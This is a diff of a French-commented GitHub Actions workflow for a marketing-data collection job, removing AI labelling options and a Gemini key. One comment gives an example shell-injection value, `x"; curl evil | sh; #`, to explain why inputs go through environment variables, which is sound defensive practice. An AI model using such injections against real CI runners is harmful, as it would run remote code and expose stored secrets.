@@ -15,16 +15,8 @@ on:
         description: "Ne traiter que cet utilisateur (récolte d'amorçage de Pulse, ou rejeu à la main)"
         type: string
         default: ""
-      label_only:
-        description: "Labellisation IA seule + republication du rapport"
-        type: boolean
-        default: false
-      categorize_only:
-        description: "Catégorisation IA des conversions GA4 seule"
-        type: boolean
-        default: false
       report_only:
-        description: "Republie juste le rapport/conseils depuis les données en base"
+        description: "Republie juste le rapport depuis les données en base"
         type: boolean
         default: false
       meta_since:
@@ -67,8 +59,6 @@ jobs:
           GOOGLE_ADS_CLIENT_SECRET: ${{ secrets.GOOGLE_ADS_CLIENT_SECRET }}
           GOOGLE_ADS_DEVELOPER_TOKEN: ${{ secrets.GOOGLE_ADS_DEVELOPER_TOKEN }}
           GOOGLE_ADS_LOGIN_CUSTOMER_ID: ${{ secrets.GOOGLE_ADS_LOGIN_CUSTOMER_ID }}
-          # Optionnel : brief IA du rapport publié (fallback déterministe sinon)
-          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
           # Optionnel : email hebdo via Resend (sans clé → dry-run, aucun envoi)
           RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
           EMAIL_FROM: ${{ secrets.EMAIL_FROM }}
@@ -76,22 +66,16 @@ jobs:
           # interpolée en `${{ }}` dans le script. Une entrée de
           # workflow_dispatch est du texte libre : collée telle quelle dans le
           # shell, `x"; curl evil | sh; #` s'exécuterait sur le runner, où
-          # vivent SUPABASE_SERVICE_KEY, GEMINI_API_KEY et RESEND_API_KEY. Les
+          # vivent SUPABASE_SERVICE_KEY et RESEND_API_KEY. Les
           # booléens sont comparés à la chaîne "true", jamais exécutés.
           META_SINCE: ${{ inputs.meta_since }}
           USER_ID: ${{ inputs.user_id }}
           REPORT_ONLY: ${{ inputs.report_only }}
-          LABEL_ONLY: ${{ inputs.label_only }}
-          CATEGORIZE_ONLY: ${{ inputs.categorize_only }}
           FORCE: ${{ inputs.force }}
         run: |
           W=saas/collecte/automatisation/fetch_all.py
           if [ "$REPORT_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
             python "$W" --report-only "$USER_ID"
-          elif [ "$LABEL_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
-            python "$W" --label-only "$USER_ID"
-          elif [ "$CATEGORIZE_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
-            python "$W" --categorize-only "$USER_ID"
           elif [ -n "$META_SINCE" ]; then
             # meta_since SANS user_id est refusé par le worker lui-même, et
             # c'est volontaire : forcer le passage de TOUS les comptes un jour
